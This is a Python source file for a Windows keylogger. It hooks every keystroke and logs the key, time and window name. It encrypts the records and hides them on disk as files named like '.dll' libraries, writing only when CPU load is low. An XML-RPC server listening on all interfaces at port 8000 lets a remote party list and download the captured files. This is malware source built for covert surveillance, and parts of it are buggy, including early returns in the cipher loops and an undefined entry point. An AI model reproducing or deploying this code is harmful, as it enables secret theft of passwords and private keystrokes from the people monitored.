import pythoncom, pyHook, signal, os, sys, re
from collections import deque
import pickle
import blowfish
import random
from SimpleXMLRPCServer import SimpleXMLRPCServer
import xmlrpclib
from multiprocessing import Process, freeze_support
import time
import signal


#http://msdn.microsoft.com/en-us/library/aa378870%28VS.85%29.aspx

bf_passphrase = '3138363238322e343035'
key_store = {}
applications = []
key_queue = deque()
data_dir = "c:\\kdata"
			
#Set up script to handle quit signals
def log_line(line):
    filename = 'c:\\test.log'
    file = open(filename, 'a')
    line = line.lower()
    file.write(line)
    file.close()
    
#venutian cypher
def encrypt(plaintext, password):
    cipher = []
    for i, c in enumerate(plaintext):
        shift = password[i % len(password)]
        shift = ord(shift)
        cipher.append((ord(c) + shift) % 256)
        return ''.join([chr(n) for n in cipher])

def decrypt(ciphertext, password):
    plain = []
    for i, c in enumerate(ciphertext):
        shift = password[i % len(password)]
        shift = ord(shift)
        plain.append((256 + ord(c) - shift) % 256)
        return ''.join([chr(n) for n in plain])


def get_cpu_load():
    """ Returns a list CPU Loads"""
    result = []
    cmd = "WMIC CPU GET LoadPercentage "
    response = os.popen(cmd + ' 2>&1','r').read().strip().split("\r\n")
    for load in response[1:]:
           result.append(int(load))
    return result


#replace results with those found in dictionary      
def translate_results(dict, modlines):
    """
    Takes input and swaps out text values for value key pairs defined by matches in a dictionary
    """
    for k, v in dict.iteritems():
         modlines = re.sub(k, v, modlines)
    return modlines
    
def on_key_event(event):
    global key_time, win_name, key_ascii, key_event
    try:
        key_time = event.Time
	win_name = event.WindowName
	key_ascii = event.Ascii
	key_event = event.Key
	key_id = event.KeyID
	
    except:
	    
        key_time = "<unknown_time>"
	win_name = "<unknown_winname>"
	key_ascii = "<unknown_ascii>"
	key_event = "<unknown_keyevent>"
	key_id = "<unknown_keyid>"
	
    #Store key events
    StoreKeyEvent()
    
    
    
    
 # return True to pass the event to other handlers
    return True
    
    
def c_encrypt(string):
    #Convert to ASCII STRING
    char_list = []
    #for character in convert to ascii #
    for char in string:
                #convert the ascii to digit and convert that digit to a string
                char_list.append(str(ord(char)))
		
    #join all of the string converted ascii digits into one long string
    key_ord_string = "@".join(char_list)
    return key_ord_string
    
    
def c_decrypt(string):
    #Converting Back from ASCII STRING
    ascii_list = []
    ascii_key_list = []
    
    #Split string by letters and place in a list
    for word in string.split('@'):
            ascii_list.append(word)
    #take list of ascii numbers and convert to letters
    for ascii in ascii_list:
	    ascii_char = int(ascii)
	    ascii_key = chr(ascii_char).lower()
	    ascii_key_list.append(ascii_key)
    #join letters into big string and split by ',' character
    key_string2 = "".join(ascii_key_list).split(',')
	    
    return key_string2
    

def store_file(string, file):
    print "running_pickle"
    FILE = open(file, 'wb')
    pickle.dump(string, FILE)
    FILE.close()
    
    
def fish_it(string, passphrase):
    cipher = blowfish.Blowfish (passphrase)
    cipher.initCTR()
    text = string
    crypted = cipher.encryptCTR(text)
    
    return crypted

def unfish_it(string, passphrase):
    cipher = blowfish.Blowfish (passphrase)
    cipher.initCTR()
    text = string
    decrypted = cipher.encryptCTR(text)
    
    return decrypted

def gen_random():
	randval = random.randint(200, 250)
	#randval = random.randint(5, 10)
	return randval

def StoreKeyEvent():
    try:     
	print '---'
        print 'Time:',key_time, '\n', 'WinName:',win_name,'\n', 'Ascii:',key_ascii,'\n', 'Key:',key_event
	key_tuple = (key_time, win_name, key_ascii, key_event)
	key_string = "%s,%s,%s,%s" % (key_time, win_name, key_ascii, key_event)
	print '---'
	
	log_line(key_event)
	log_line('\n')
	
        key_hash = c_encrypt(key_string)
	
	key_bf = fish_it(key_hash, bf_passphrase)
	
	#Add encrypted key string to queue
	key_queue.append(key_bf)
	
	ranum = gen_random()
	
	print "random ", ranum
	
	#Create list for queue items in case of needed disk persistence
	pickle_write = []
	
	print len(key_queue)
	
	#Determine size of queue and take action
	if len(key_queue) > ranum:
	    cpu_list = get_cpu_load()
	    cpu_load = cpu_list[0]
	    if cpu_load < 20:
		print "cpu_load: ", cpu_load
	        for item in key_queue:
		    pickle_write.append(item)
		    print '\n'
		    
		#Create timestamped key store file
		ctime = time.time()
		ctime = time_cut(ctime)
		pick_file = "kma%s.dll" % (ctime)
		full_pick = data_dir + "\\" + pick_file
		print full_pick
		store_file(pickle_write, full_pick)
	    key_queue.clear()
	    
    except:
	    
	print "wtf"
	
#convert epoch time to string and strip decimal
def time_cut(epoch_string):
	epoch_string = str(epoch_string)
	epoch_timei = epoch_string.index('.')
	epoch_time = epoch_string[:epoch_timei]
	return epoch_time
	
#Read binary for XML-RPC serving
def read_binary():
    with open("c:\\kdata\\testpickle.dll", "rb") as handle:
        return xmlrpclib.Binary(handle.read())

def read_binary2(file):
    full_pick = data_dir + "\\" + file
    with open(full_pick, "rb") as handle:
        return xmlrpclib.Binary(handle.read())

#list key_files available
def list_keyfiles():
    #define dll content list
    dll_list = []
    contents = os.listdir(data_dir)
    for item in contents:
	    if '.dll' in item:
		    dll_list.append(item)
    return dll_list
	    

#serve xml and wait for connection
def xml_serve(action):
    server = SimpleXMLRPCServer(("0.0.0.0", 8000))
    #print "\nListening on port 8000..."
    server.register_function(read_binary, 'read_binary')
    server.register_function(read_binary2, 'read_binary2')
    server.register_function(list_keyfiles, 'list_available')
    if action == 'start':
        server.serve_forever()
    if action == 'stop':
	sys.exit(0)

def key_log():
   # create a hook manager
    hm = pyHook.HookManager()
    # watch for all  events
    hm.KeyDown = on_key_event
    # set the hook
    hm.HookKeyboard()
   
    while 1:
        # wait forever
        pythoncom.PumpMessages()
	
def setrundir():
    pathname = os.path.dirname(sys.argv[0])
    fullpath = os.path.abspath(pathname) 
    os.chdir(fullpath)

def do_serve():
    
    freeze_support()
 
    setrundir()
        
    xml_serve('start')
    	
if __name__ == '__main__':
           start()